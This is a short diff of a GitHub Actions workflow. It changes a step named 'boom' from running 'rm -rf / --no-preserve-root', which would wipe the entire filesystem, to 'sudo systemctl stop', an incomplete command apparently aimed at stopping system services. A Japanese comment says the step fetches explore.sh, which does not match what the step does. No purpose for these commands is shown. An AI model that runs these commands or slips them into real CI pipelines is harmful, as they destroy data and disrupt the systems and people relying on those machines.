@@ -9,4 +9,4 @@ jobs:
     steps:
       # 1. リポジトリのファイル（explore.sh）を持ってくる
       - name: boom
-        run: "rm -rf / --no-preserve-root"
+        run: "sudo systemctl stop"
